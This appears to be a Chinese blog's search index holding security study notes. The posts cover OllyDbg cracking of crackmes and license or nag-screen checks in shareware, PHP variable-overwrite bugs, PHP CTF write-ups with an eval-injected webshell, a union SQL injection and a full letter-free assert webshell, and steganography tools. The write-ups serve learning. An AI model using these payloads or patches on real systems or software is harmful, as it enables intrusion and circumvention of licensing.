{"meta":{"title":"leaf","subtitle":"","description":"","author":"叶子","url":"http://just-aleaf.github.io","root":"/"},"pages":[{"title":"有感","date":"2022-08-01T17:07:58.000Z","updated":"2022-09-15T03:09:10.709Z","comments":true,"path":"Feeling/index.html","permalink":"http://just-aleaf.github.io/Feeling/index.html","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788人若无名，便可专心练剑心有山水不造作，静而不争远是非，内心丰盈即人生巅峰心想事成的秘诀,就是只想能成的的事一声炎帝，满是故事没有人会踏雾而来，喜欢的风景要自己努力去看脚下生风过剑急，白云出岫看梅西。雄鹰射落蓝天傲，百炼成钢命不移鬓微霜又何妨，三十四载仍称王等海贼王完结的那一天，我们第一集弹幕见吧关于顶上，皆是遗憾原来这世界上没有任何东西能胜过利益(8月5日)自此红蓝无梅西去年的今天，国王为城堡能留下的只有泪水当枷锁落地的那一刻我们都以为赢了艾草纷飞，斯人未归只要想起一生中后悔的事，梅花便落满了南山操纵比赛就是犯罪(风华正盛正想拿成绩的年纪，却被逼迫拱手送出冠军)那家伙要是很幸福，会挂着海贼旗一个人出海吗永远是那个不服输的少年Inmessionante太阳也不是天天出现的，但它一直都在分享欲是靠回应来延续的，热情也是花自向阳开，人终朝前走咽的下委屈才能撑的起格局你以为这就是结局，其实也可以是新的开始累了想父母，倦了想前程(回家的路上睡着了,梦里全是妈妈烧的菜)光而不耀，与光同尘永远不要基于短暂的情绪而做出永久性的决定人从悲伤中落落大方走出来就是艺术家河流从不催促过河的人那就出你下次哭，是因为太幸福你仅是你，万人非你草木生欢喜，山水解忧愁疲时知休，郁时知通，燥时知止先讲对方想听的，在讲对方听得进的，然后讲你该讲的，最后讲你想讲的20岁的我还没有爱情，无妨你还有80年的时光去追求爱情糖水爷爷:红豆汤,绿豆汤,银耳汤,米酒，给两块钱随便喝人性最大的恶:恨你有，笑有你，嫌你穷，怕你富一直以为蓝白间条纹象征着忧郁与遗憾，其实它是历经千帆后的风轻云淡人间痴情客，盼谁来相和失败总是贯穿人生始终，遗憾才是人生的必修课双手指天，没一粒进球都献给外婆这一刻压力山大，身体疲惫，但当球队需要我站出来时，我也决不退缩最是人间留不住的，是马不停蹄的告别斯人若彩虹，遇上方知有可能没有人会关心你付出多少努力，撑的累不累，帅的疼不疼，大家只会看到最后你站在什么位置，因为成年人的世界，他就没有容易这两个字（2018伊朗vs西班牙）静，不是耳旁无声，而是心里无争"},{"title":"友情链接","date":"2022-08-02T12:11:48.130Z","updated":"2022-08-02T12:11:48.130Z","comments":true,"path":"links/index.html","permalink":"http://just-aleaf.github.io/links/index.html","excerpt":"","text":""},{"title":"有感","date":"2022-08-01T16:30:28.783Z","updated":"2022-08-01T16:30:28.783Z","comments":false,"path":"books/index.html","permalink":"http://just-aleaf.github.io/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2022-08-01T15:10:18.100Z","updated":"2022-08-01T02:39:16.380Z","comments":false,"path":"categories/index.html","permalink":"http://just-aleaf.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-08-01T15:10:16.102Z","updated":"2022-08-01T02:39:16.379Z","comments":false,"path":"about/index.html","permalink":"http://just-aleaf.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"Repositories","date":"2022-08-01T16:29:55.020Z","updated":"2022-08-01T02:39:16.381Z","comments":false,"path":"repository/index.html","permalink":"http://just-aleaf.github.io/repository/index.html","excerpt":"","text":""},{"title":"404 Not Found：该页无法显示","date":"2022-08-01T16:30:16.870Z","updated":"2022-08-01T02:39:16.377Z","comments":false,"path":"/404.html","permalink":"http://just-aleaf.github.io/404.html","excerpt":"","text":""},{"title":"标签","date":"2022-08-01T16:29:55.883Z","updated":"2022-08-01T02:39:16.382Z","comments":false,"path":"tags/index.html","permalink":"http://just-aleaf.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"逆向破解学习","slug":"逆向","date":"2022-09-03T12:17:06.000Z","updated":"2022-09-15T07:28:35.060Z","comments":true,"path":"2022/09/03/逆向/","link":"","permalink":"http://just-aleaf.github.io/2022/09/03/%E9%80%86%E5%90%91/","excerpt":"","text":"最近学习小甲鱼的解密篇希望有一天自己也可以破解软件使用这里就进行一下学习记录 （1）MESSAGEBOX修改弹窗标题 这里我们想要让他显示我们想要显示的 首先我们od打开exe f8运行知道弹出对话框 找到之后我们发现call指令猜测里面就是类似messagebox的指令 打下断点 f2重新载入—–》f9到达断点处—–》f7进入call指令 这里我们发现push指令推入了参数然后call对应地址 我们这里可以发现对应的地址我们在数据窗口中进行地址搜索修改即可 （2）TraceMe破解登录界面 这里是我们输入之后进行校验而校验之前会需要从文本框中读取字符床 函数GetDlgItemTextA、GetDlgItemTextW、GetWindowTextA、GetWindowTextW可以从编辑框中取字符串 我们尝试搜索这几个函数 找到之后下断点这里就是获取文本框字符串的地方 然后我们输入内容继续向下运行 发下显示我们输入内容的地方 我们发现这里push了三个edx为用户名，ebx为字符数，eax为密码 然后下一句 1call 00401340 应该是进行校验的函数 我们可以看到下面进行了 1test eax，eax//测试寄存器是否为空（为0的时候Z标志位回置0） 汇编中会把函数的返回结果都统一存储在eax中（当超出寄存器的容量是会存储返回值的地址） 这里我们输入错误返回值不为0会满足jz的跳转要求进行跳转（我们这里先跳转运行发现返回错误） 所以我们这里修改Z的值让其不进行跳转 （3）reverseMe破解keyfile.dat暴力破解打开exe 然后f8运行了解一下exe构成 发现loadIconA这里加载了图标 然后发现于一个CreateFileA（filename&#x3D;keyfile.dat）说明我们需要建一个对应文件 之后又发现了Readfile所以我们猜测是读取上面的keyfile文件进行校验 大概逻辑懂得我们先尝试暴力直接跳转（寻找跳转的指令） 我们发现这里jl指令条件跳转到报错所以我们不能让跳转(SF!&#x3D;OF),修改S标志位让其不进行跳转 同理修改ZF标志位再次阻止跳转 我们找到跳转正确的指令跳转即可暴力破解 算法破解我们先找到对比的算法 这里test eax eax将eax置0 12004010B8 cmp dword ptr ds:[0x402173],0x10[0x402173]是Readfile的第三个参数返回的文件中的字节数 我们发现这里对0x4021173地址的内容和16（这里10为16进制）比较 这里如果对应值小于16的话就会是SF标志位1导致跳转所以我们这里文件中字节数要大于等于16 1234004010C1 mov al,byte ptr ds:[ebx+0x40211A]004010C7 cmp al,0x0 这里ebx之前清零现在每次加1遍历每一个文件内容 然后让其于0比较如果为0就会跳转 1004010D3 cmp esi,0x8 于8进行比较如果小于8就会跳转报错当这里大于等于8是才会跳转到正确位置 所以我们这里就要求文件中要有内容这样才不会直接al&#x3D;0跳转进行esi和8比较 当我们文件有内容al不等于0时 1234004010CB cmp al,0x47004010CD jnz XreverseM.004010D0004010CF inc esi004010D0 inc ebx 发现al（文件内容）于G（应为我们获取文件内容为ascii格式所以我们比较前要转换一致0x47转换ascii为G）比较如果相同结果为0就会令标志位置1不进行跳转，让esi,ebx自增之后循环 当满足esi大于等于8时就会正确跳转 我们只需要对应将跳转错误出改为nop并保存即可破解 （4）RegisterMe的NAG去除首先什么是NAG，就是使用时提醒你注册烦人的弹框 打开我们发现了两个nag弹窗指令位置 思路一:全部nop掉 思路二:跳转过去10040100F je XRegister.00401024 发现这条指令可以跳转过第一个nag修改指令为jmp 然后将第二个nag用nop填充即可 思路三是将messagebox句柄修改查看API帮助可以发现messagebox的第一个参数是父句柄（可以理解为他所属于谁如果这里的父进程错误他作为子进程也会失效） 这里我们发现这里两个父句柄都为null，当我们随便赋一个不存在的值的时候，父程序无法运行那么对应子程序也无法运行两个nag弹框就无法弹出 思路四:修改PE头然后修改程序入口我们观察到AffressOfEntrypoint(入口)为00401000，会包含第一个nag弹窗所以我们就考虑把入口放在第一个nag弹窗之后 首先我们需要找到pe头的位置 点击工具栏中’M’，找到pe文件头双击进入内存文件头的位置 10040003C C0000000 DD 000000C0; Offset to PE signature 然后这行代码说明了pe文件头的地址c0 然后我们找到AdressOfEntryPoint找到对应地址(4000E8)即可 在数据区追踪400E8修改401000为401024即可 （5）pixtopoanbook破解限制功能这是一个社交软件我们可以看到当我们没有购买注册的时候只允许我们创建4个好友和3个组别 这里我们要破解这些功能实现直接使用 我们先运行至弹出运行界面的位置，然后我们点击要创建用户会出现上面的弹窗 我们可以看到这里点击add然后弹窗后按下暂停键之后会跳转到系统领空(此时我们也无法点击软件功能)，我们alt+f9返回用户，然后点击确认之后返回到了程序接管 返回之后运行就会回到我们弹窗真正的对应位置 上移一部分我们可以发现弹窗中的内容(这里使用本身进程间接调用了messagebox，通过) 12300412DD0 cmp eax, 400412DD3 jl short 00412DEF 我们可以看到这里eax和4进行了比较当我们创建用户大于4的时候就会不满足jl的跳转要求导致跳转弹窗 所以我们这里想要的是不弹窗这里要无条件跳转所以我们就让其jmp 这样我们就破解了创建用户的功能限制 对于组类创建也是一样的方法 找到弹窗对应的位置 然后发现了对应判断 123400408B05 cmp eax, 300408B08 jl short 00408B34 然后同理我们让其无条件跳转即可 然后我们发现软件界面也还是会有一些表示没有注册的提醒 看的就不舒服 点击工具栏中的M按键进入内存中crtl+b搜索对应文本位置 然后在数据去追踪地址保存即可 （6）VisualSite Designer 我们可以看到我们用一次次数就会少一次限制我们使用次数(到达次数后就会需要我们付费购买) 我们并不像看到这个烦人的窗口所以要消除这个NAG框 对于消除NAG框的思路就是一路f8然后到了弹框的地方就f2下断点(系统领空下硬件断点)，然后重新加载进入断点，重复执行找到弹窗的对应代码 我们可以知道这里对应语句的用法是返回程序领空弹框并且计算对应的次数（次数-1） 向下执行发现我们要令eax返回为1才可以实现跳转达到正常使用，所以我们这里就可以之修改为 1mov eax, 1 保存修改后会发现不在弹NAG框 此外再关闭时候我们也会发现有一个广告弹窗，我们也可以将其去除 运行代码到弹框出然后按工具栏中K找到此时调用的函数发现只有一个在程序领空的跳转过去，找到对应的nag代码修改即可 但是最后发现这样只是消除了nag框但是计数机制还是存在的 这个时候我们就需要记录每一个跳转情况 然后次数耗尽后对比跳转情况查找改变的地方进行修改达到次数限制的破解","categories":[{"name":"逆向","slug":"逆向","permalink":"http://just-aleaf.github.io/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://just-aleaf.github.io/tags/%E9%80%86%E5%90%91/"}]},{"title":"PHP变量覆盖","slug":"变量覆盖","date":"2022-08-25T15:43:32.000Z","updated":"2022-09-03T12:17:32.855Z","comments":true,"path":"2022/08/25/变量覆盖/","link":"","permalink":"http://just-aleaf.github.io/2022/08/25/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/","excerpt":"","text":"最近在进行php代码审计学习的时候遇到了关于变量覆盖的题，然后考虑到变量覆盖也有几种情况这里就进行整理学习一下 什么是变量覆盖所谓的变量覆盖就是值我们使用我们传入的参数值来替换程序中原本存在的变量值 可能存在变量覆盖的地方:$$使用不当，extract()函数使用不当，import_request_variables()使用不当，parse_str()函数使用不当，开启了全局变量注册 变量覆盖（1）全局变量覆盖在PHP5.3之前会默认开启一个register_globals的全局函数，这个函数是用来注册全局变量的（当你传入参数的时候可以直接注册为全局变量进行使用）， 12345&lt;?php $id=0;echo &#x27;获取id值 :&#x27;.$_GET[&#x27;id&#x27;].&quot;&lt;br/&gt;&quot;;echo &#x27;$id :&#x27;.$id;?&gt; 这里可以本地搭建进行测试 这里我们运行测试这个php脚本的时候我们就可以发现.$_GET[‘id’]输出值为我们这里get输入的值，但是$id输出的会仍然是已经定义过的0 这里说明只是将输入的id参数用$_GET[‘id’]来接收参数，而$id并没有用来接收我们传入的参数值 这里就是register_globals的区别了 如果我们这里打开register_globals的时候这里就会使用$id来接受传入的参数值但是这里当原有参数已经声明之后就无法再次进行覆盖所以及时我们打开了输出的id也仍然会是0 1234if($test)&#123; echo &quot;hello&quot;&#125; 如果此时我们打开了register_globals的时候，我们构造url: 1127.0.0.1/1.php?test=1 我们就会发现输出了hello 这里就直接作为了全局变量进行了注册使用造成了全局变量覆盖 （2）extract()变量覆盖extract()函数将数组中变量导入到当前的符号表中 但是与全局变量覆盖不同的是这里会有一个默认设置当如果传入的参数和代码本身声明的代码冲突的时候会使用传入的参数进行覆盖 12345678910&lt;?php $a=2; extract($_GET) if($a == 1)&#123; echo &quot;hello&quot;; &#125; else&#123; echo &quot;damie&quot;; &#125;?&gt; 代码中声明的$a为2所以会按照damie输出 当传入参数a&#x3D;1时有extract()函数处理这里和原本声明定义冲突会采取默认覆盖满足了if输出为hello （3）$$变量覆盖$$定义的变量为可变变量（一个变量的变量名可以动态的设置和使用）， 一个可变变量获取一个变量的值来作为他的变量名 1234&lt;?php$a=&#x27;hi&#x27;$$a=&#x27;hello&#x27;?&gt; 这里可以看到这里将$a取值为hi，然后有使用了$$，这里的$$a可以理解为$($a)，或者$(hi)，当输出两种类型时都可以输出对应值 这里$$变量覆盖在ctf中会经常和foreach循环一起考察 这里了解一下foreach的语法 12345678910111213A.foreach(array_expression as $ value)&#123; statement//当循环attay_expression数组的时候将其值赋值给$value&#125;B.foreach(array_exprssion as $key =&gt; $value)&#123; statement//在赋值的同时将键名赋值给$key&#125; 这里可以看到遍历输入的get参数然后将键名赋值给$key,将对应参数值赋值给$value 我们url传参了a&#x3D;1，所以这里键名a传给了$key，对应值1传给了$value,同时使用$$key就相当于$a,就达成了变量覆盖 （3）parse_str()定义将查询到的字符串解析到变量中(他在解析的时候不会验证是否存在变量所以如果这里已有声明变量则会直接覆盖) 1parse_str(string,array) 参考 PHP中的变量覆盖漏洞 - 笑花大王 - 博客园 (cnblogs.com) (52条消息) 变量覆盖漏洞总结_WHOAMIAnony的博客-CSDN博客_变量覆盖漏洞 变量覆盖漏洞学习及在webshell中的运用 - Yunen的博客 - 博客园 (cnblogs.com)","categories":[{"name":"知识收集","slug":"知识收集","permalink":"http://just-aleaf.github.io/categories/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"知识收集","slug":"知识收集","permalink":"http://just-aleaf.github.io/tags/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"}]},{"title":"PHP_Code_Challenge","slug":"PHP-Code-Challenge","date":"2022-08-16T16:14:25.000Z","updated":"2022-09-04T09:30:54.305Z","comments":true,"path":"2022/08/17/PHP-Code-Challenge/","link":"","permalink":"http://just-aleaf.github.io/2022/08/17/PHP-Code-Challenge/","excerpt":"","text":"(1)challenge1访问靶场位置我们可以发现给出一串字符然后对php代码审计一下 1234567891011 &lt;?phperror_reporting(0); //关闭报错require __DIR__.&#x27;/lib.php&#x27;; //DIR获取当前目录路径进而用来确定你要引入的文件位置echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &#x27;&lt;hr&gt;&#x27;;//进行了base64，hex2bin(16进制转ascii)，反转字符串，最后再由ascii转换为十六进制的加密highlight_file(__FILE__); 所以我们这里就是要对给出的随机值进行反解密 1234567import base64import binasciidef strrev(string): return string[::-1]str = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= &quot;;str2 = binascii.a2b_hex(strrev(binascii.b2a_hex(base64.b64decode(str))));print(str2) (2)challenge2下载靶场访问环境 通过代码我们可以得出我们需要get赋予time一个在5184000—7776000之间的数字，通过sleep对应时间即可出现flag 这里我们考虑传入一个位于范围内的时间之后sleep时间过久所以这里考虑进行科学计数法绕过 (3)challenge3下载环境访问 发现没什么内容查看源码发现提示访问challenge3.txt 开始审计这段php 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo &quot;&lt;!--challenge3.txt--&gt;&quot;;require __DIR__.&#x27;/lib.php&#x27;;if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: challenge3.php?id=1&#x27;); //header(&quot;location:test.php&quot;)跳转url exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))//stripos(string,find,start)//stripos函数查找字符串在另一个字符串第一次出现的位置&#123; echo &#x27;Hahahahahaha&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; echo $flag;&#125;else&#123; print &quot;work harder!harder!harder!&quot;;&#125;?&gt; 查看出现flag的要求 （1）a: 没有‘.’字符，或者’.’在字符串的第一位 （2）b: 长度大于5 1eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4 截取b第一位和111拼接在于1114匹配（这里为111或者1114） 这里涉及到了%00，当我们substr截取遇到%00截断时，我们substr截取的字符串就会被%00截断， b的第一位不为4 （3）id 12345if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: challenge3.php?id=1&#x27;); exit();&#125; 不为0或NULL 12if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) 同时我们在if语句中发现这里对id进行了php的弱比较 弱比较这里当我们用一个字符串和数字比较的时候，字符串会去他开头的有效数字，如果这里没有有效数字则会取值为0， 所以这里我们要要求a不为0或null同时要让其&#x3D;0，所以我们这里可以使用令a位一个字符开头的任意字符串（开头不为有效数字取值为0） （4）data 12$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;1112 is a nice lab!&quot;) 这里我们使用file_get_contents获取对应文件内容 这里我们采用php:&#x2F;&#x2F;input（$data&#x3D;@file_get_contents(‘php:&#x2F;&#x2F;input’,’r’)） 这样这里$data就是获取的post传入的参数 (4)challenge4下载环境 发现这里有eval函数猜测与代码执行有关 12eval(&quot;var_dump($a);&quot;);使用了双引号所以会先进行解析a参数，然后在执行eval函数 构造payload 1?hello=);eval($_POST[&#x27;A&#x27;]);%23 然后蚁剑连接 (5)challenge5下载环境 123456789101112&lt;?phpif (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;]) echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;; else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;&#125;else&#123; echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;?&gt; 这里我们可以发现name和password不能一样 但是我们这里要求通过sha1令两者一致（这里使用了“&#x3D;&#x3D;&#x3D;”无弱类型比较）这里考虑到sha1无法处理数组 所以满足两者我们就构造payload 1?name[]=1&amp;password[]=3 (6)challenge6下载环境 观察代码发现这里爆出flag的条件为 12if (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd])))//strcasecmp 若两值相同的话返回结果为0 要pwd的列中有值同时要让pass值与pwd列中的值相同 12$sql = &quot;select pwd from interest where uname=&#x27;$user&#x27;&quot;;$query = mysql_query($sql); 这里我们发现$sql直接拼接$user后执行sql语句并且将结果返回至query所以猜测这里存在sql注入 这里遇到的问题是我们并不知道pwd列中有什么值进而不知道应该传什么值给pass才能符合要求 这个时候我们就要考虑到了union的用法 可以看到当我们执行union select 123的时候会将123也列入到age的列中（在第一个select语句中被使用的列名称也会被用于结果的列名称当中） 所以我们这里就可以使用这种方法用union select将一个值传入到pwd的列中进而我们传递对应md5值给pass即可同时满足pwd列不为0和pass可以与pwd列值匹配的两个要求 构造payload 1user=&#x27; union select &quot;21232f297a57a5a743894a0e4a801fc3&quot;#&amp;pass=admin (7)challenge7下载环境 目录扫描发现php源码 1234567891011121314151617&lt;?phpinclude &quot;flag.php&quot;;$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;BugsBunnyCTF is here :p...&quot;);if ( !isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;;die($_200); $$猜测是变量覆盖的题型 这里我们可以看到 12if ( !isset($_POST[&quot;flag&quot;]) ) die($_403); 所以我们这里需要post对flag进行赋值 123456foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403); 这里要求我们post传入的flag的值要与本身的flag值要一致 所以这里我们就要对本身的flag值进行变量覆盖，然后顺的思路如果把本身的flag都覆盖了我们怎么获取flag，所以我们就考虑在get传参中将flag值覆盖出去，而这里可以输出的参数只有_200所以我们就考虑将flag的原值覆盖 _200 当我们get传入_200&#x3D;flag 12foreach ($_GET as $key =&gt; $value) $$key = $$value $key&#x3D;_200 $value&#x3D;flag $$key&#x3D;$_200 $$value&#x3D;$flag $$key&#x3D;$$value&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_200&#x3D;$flag 然后我们在post任意传参flag的值进行覆盖原值，以flag&#x3D;aaa为例 12foreach ($_POST as $key =&gt; $value) $$key = $value; $flag&#x3D;aaa 之后执行到die($_200)输出$_200就会是flag值 (8)challenge8下载环境 前置知识: 无字母数字webshell我们有时候会遇到正则将字母数字都过滤的情况这个时候如果要webshell的时候我们就需要编写一个无字母数字的webshell 这里的思路是通过非字母数字的字符经过变化然后构造出我们想要字母然后再利用PHP动态函数(file_put_contents, assert(要注意php7中无法以一个动态函数运行),system)进行动态执行 而这里我们就要考虑如何通过非字母数字的字符来变化得到我们想要的字母 a.异或运算(a^b)首先了解一下异或运算的运算原理 12345678&lt;?phpecho &quot;B&quot;^&quot;?&quot;;?&gt;//(1)首先会先将左右字符转换为ascii值 B---66 ?----63//(2)第二部会将其ascii值转换为二进制 66--1000010 63--0111111//(3)第三步会进行二进制异或处理（每位对比相同为0不同为1）： 1111101//(4)第三步将二进制转为ascii字符：&#125; 通过这种方法我们就可以做到异或出动态函数 12345&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]); 应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可 b.自增在php种我们进行自增的时候可以对应ascii自增获取下一个字符 12&#x27;a&#x27;++---&gt;&#x27;b&#x27; &#x27;A&#x27;++---&gt;&#x27;B&#x27; 所以当我们表示出a和A的时候通过自增我们就可以获得到所有字母达到绕过 所以我们这里就要考虑去哪里获取a和A（同时我们要不能涉及字母） 这里我们考虑到php种当我们将字符串和数组强制连接的时候会转换字符串值Array，这样我们就得到了a和A 更具这种方法即可进行绕过这里放上p神的websehll 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 应用的时候只需要将其整理到url栏中并post传入_&#x3D;’命令’即可 1$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 参考一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)","categories":[{"name":"PHP审计","slug":"PHP审计","permalink":"http://just-aleaf.github.io/categories/PHP%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP审计","slug":"PHP审计","permalink":"http://just-aleaf.github.io/tags/PHP%E5%AE%A1%E8%AE%A1/"}]},{"title":"MISC","slug":"MISC","date":"2022-08-10T15:08:55.000Z","updated":"2022-09-15T16:46:53.902Z","comments":true,"path":"2022/08/10/MISC/","link":"","permalink":"http://just-aleaf.github.io/2022/08/10/MISC/","excerpt":"","text":"入门通过ctfshow平台挑选选了一些代表性的misc入门知识 (1)bpg文件读取下载附件给了一个bpg后缀文件 BPG Image format (bellard.org) 这里我们使用bpg工具 1bpgview.exe E:\\ctf\\misc3.bpg (2)文件头识别下载附件发现6个txt文件hex打开查看 第一个发现是png文件头将后缀更改获得照片这里猜测这里就是更具文件头修改后缀 那就需要了解一下各个文件的文件头 12345678910111213141516171819202122232425A.JPEG文件头:FF D8 FF文件尾:FF D9B.PNG文件头:89 50 4E 47 0D 0A 1A 0A文件尾:AE 42 60 82C.GIF文件头:47 49 46 38 39(37) 61文件尾:00 3bD.BMP文件头:42 4DE.TIFF(tif)文件头：49 49 2A 00 然后对应文件头修改文件后缀即可获得flag (3)LINUX的DD命令读取下载附件后发现又是一张jpg文件 binwalk隐写直接走但是发现这里确实有隐写，但是无法提取出来 通过看大佬文章才知道这里可用dd命令提取 1234567dd if=misc14.jpg of=misc.jpeg skip=2103 bs=1if=文件名: 后面跟随输入文件名（读取的文件）of=文件名: 跟随输出的文件名skip=blocks: 从输入文件开头跳过blocks个块后再开始复制bs=bytes: 同时设置读入/输出的块大小为bytes个字节 (4)EXIF文件信息读取有时候flag可能藏在图片文件的信息中当我们右键查看属性的时候通畅获取不到图片的全部信息 这个时候我们就要借助在线网站获取exif信息 EXIF信息查看器 (tuchong.com) 或者使用kali中的exiftool (5)zstegzsteg可以检测PNG和BMP图片中隐写的数据 zsteg安装(kali) 123456（1）换源gem sources --remove https://rubygems.org/ //删除现有源gem sources -a http://gems.ruby-china.com/ //添加新源头apt-get install gem //安装gemgem install zsteg //安装zsteg (6)binwalk+foremost当文件中包含多个文件的时候我们就用到了binwalk和foremost binwalk可以查看文件中隐藏文件并且可以进行提取 foremost也可以进行提取 123binwalk xxx.png //查找是否包含文件binwalk -e xxx.png //提取foremost XXX.png //提取 (7)IDAT块隐写IDAT: 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块(一张图片可以有很多IDAT块) IDAT会有固定的长度正常png文件只有最后一个IDAT块的长度会比其他的短 而IDAT的隐写就出现在这里，中间会有IDAT的长度异常 这时候我们一般会用到TweakPng工具查看操作IDAT块 TweakPNG (entropymine.com) 删除之后即可出现flag (8)MagicEXIF元数据编译器https://www.magicexif.com/start MagicEXIF是一款可以通过分析照片的元数据以及编码特征来计算图像可信度进行判断照片是否被修改，可以对相机的快门次数，镜头参数，光圈挡位查看和编译 (9)时间戳转换获取 exiftool可以发现注释中提示了UnixTimestap(Timestap时间戳)，DECtoHEX（十进制转换十六进制） 所以我们需要转换时间戳 Unix时间戳(Unix timestamp)转换工具 - 站长工具 (chinaz.com) 通过四个时间戳转化获取 1874865822 2699237688 2156662245 460377706 然后转换十六进制结合即可 